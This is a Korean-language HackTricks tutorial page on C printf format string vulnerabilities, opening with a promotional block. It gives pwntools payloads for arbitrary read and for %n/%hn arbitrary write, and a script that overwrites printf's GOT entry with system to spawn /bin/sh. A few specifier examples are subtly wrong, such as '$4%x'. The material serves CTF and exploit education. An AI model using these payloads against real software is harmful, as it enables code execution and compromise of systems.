# 포맷 문자열

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 AWS 해킹을 배우세요</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **HackTricks에 귀사를 광고하고 싶으세요**? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요, 저희의 독점 [**NFT 컬렉션**](https://opensea.io/collection/the-peass-family)
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 얻으세요
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 트릭을 공유하고 싶으시다면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **로 PR을 제출**해주세요.

</details>

## 기본 정보

C 언어에서 **`printf`**는 **문자열을 출력**하는 데 사용할 수 있는 함수입니다. 이 함수가 기대하는 **첫 번째 매개변수**는 **포매터가 있는 원시 텍스트**입니다. 기대되는 **다음 매개변수**는 원시 텍스트에서 **포매터를 대체할 값**입니다.

취약점은 **공격자 텍스트가 이 함수의 첫 번째 인수로 사용될 때** 발생합니다. 공격자는 **printf 포맷 문자열 기능을 악용**하여 **모든 주소의 데이터를 읽고 쓸 수 있는 특수 입력을 만들어** 임의의 코드를 실행할 수 있습니다.

#### 포맷터:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**예시:**

* 취약한 예시:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* 일반적인 사용:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* 누락된 인수가 있는 경우:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
### **포인터 접근**

형식 **`%<n>$x`**, 여기서 `n`은 숫자이며, printf에게 n 번째 매개변수(스택에서)를 선택하도록 지시할 수 있습니다. 따라서 printf를 사용하여 스택에서 4번째 매개변수를 읽고 싶다면 다음을 수행할 수 있습니다:
```c
printf("%x %x %x %x")
```
그리고 첫 번째부터 네 번째 매개변수까지 읽을 수 있습니다.

또는 다음을 수행할 수 있습니다:
```c
printf("$4%x")
```
그리고 직접 네 번째를 읽으십시오.

공격자가 `pr`**`intf` 매개변수를 제어한다는 점에 유의하십시오.** 이는 공격자의 입력이 `printf`가 호출될 때 스택에 있을 것을 의미하며, 이는 공격자가 스택에 특정 메모리 주소를 쓸 수 있다는 것을 의미합니다.

{% hint style="danger" %}
이 입력을 제어하는 공격자는 **임의의 주소를 스택에 추가하고 `printf`가 그 주소에 액세스하도록** 만들 수 있습니다. 다음 섹션에서 이 동작을 사용하는 방법에 대해 설명될 것입니다.
{% endhint %}

## **임의의 읽기**

포맷터 **`$n%s`**를 사용하여 **`printf`**가 **n 위치**에 있는 **주소**를 가져와 그 뒤를 따라가서 **문자열처럼 출력**할 수 있습니다(0x00이 발견될 때까지 출력). 따라서 이진 파일의 기본 주소가 **`0x8048000`**이고, 사용자 입력이 스택의 4번째 위치에서 시작한다는 것을 알고 있다면, 다음과 같이 이진 파일의 시작 부분을 출력할 수 있습니다:
```python
from pwn import *

p = process('./bin')

payload = b'%6$p' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
주소 0x8048000을 입력의 시작 부분에 넣을 수 없습니다. 왜냐하면 해당 주소의 끝에 0x00이 연결될 것입니다.
{% endhint %}

## **임의 쓰기**

포맷터 **`$<num>%n`**은 스택의 \<num> 매개변수에 **쓰여진 바이트 수**를 **지정된 주소**에 **쓰게** 합니다. 공격자가 printf로 원하는 만큼 문자를 쓸 수 있다면, **`$<num>%n`**을 사용하여 임의의 숫자를 임의의 주소에 쓸 수 있습니다.

다행히도, 숫자 9999를 쓰기 위해서는 입력에 9999개의 "A"를 추가할 필요가 없습니다. 대신, **`%.<num-write>%<num>$n`** 포맷터를 사용하여 **`<num-write>`** 숫자를 **`num` 위치가 가리키는 주소**에 쓸 수 있습니다.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
그러나 일반적으로 `0x08049724`와 같은 주소를 작성하기 위해서는 (이는 한 번에 작성할 수 있는 매우 큰 숫자입니다), **`$n` 대신에 `$hn`을 사용**합니다. 이를 통해 **2바이트만 작성**할 수 있습니다. 따라서 이 작업은 주소의 최상위 2바이트와 최하위 바이트에 대해 두 번 수행됩니다.

따라서 이 취약점을 통해 **임의의 주소에 임의의 내용을 쓸 수 있습니다 (임의 쓰기).**

이 예에서 목표는 나중에 호출될 **GOT** 테이블의 **함수**의 **주소**를 **덮어쓰는 것**입니다. 이는 다른 임의 쓰기를 실행하는 기술을 악용할 수 있습니다:

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

**사용자**로부터 **인수**를 **받는 함수**의 **주소**를 **`system`** **함수**로 **지정**할 것입니다.\
언급한대로 주소를 작성하려면 일반적으로 2단계가 필요합니다: 먼저 주소의 2바이트를 작성한 다음 나머지 2바이트를 작성합니다. 이를 위해 **`$hn`**이 사용됩니다.

* **HOB**는 주소의 상위 2바이트를 가리킵니다.
* **LOB**는 주소의 하위 2바이트를 가리킵니다.

그런 다음, 형식 문자열이 작동하는 방식 때문에 먼저 \[HOB, LOB] 중 **더 작은 값을 작성**한 다음 다른 값을 작성해야 합니다.

만약 HOB < LOB이면\
`[주소+2][주소]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

만약 HOB > LOB이면\
`[주소+2][주소]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntools 템플릿

이러한 취약점을 이용한 exploit을 준비하기 위한 템플릿을 다음에서 찾을 수 있습니다:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

또는 [**여기**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite)의 기본 예제에서:
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## 기타 예제 및 참고 자료

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32비트, relro 없음, 캐너리 없음, nx, 파이 없음, 스택에서 플래그를 누출하기 위해 기본적인 형식 문자열 사용 (실행 흐름 변경 필요 없음)
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32비트, relro, 캐너리 없음, nx, 파이 없음, 형식 문자열을 사용하여 `fflush` 주소를 win 함수로 덮어쓰기 (ret2win)
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32비트, relro, 캐너리 없음, nx, 파이 없음, 형식 문자열을 사용하여 `.fini_array` 내부의 main 주소에 주소를 쓰고, `system`을 `strlen`을 가리키도록 하는 GOT 테이블에 주소를 쓰기. 흐름이 main으로 돌아가면 사용자 입력과 함께 `strlen`이 실행되고 `system`을 가리키며 전달된 명령을 실행함.
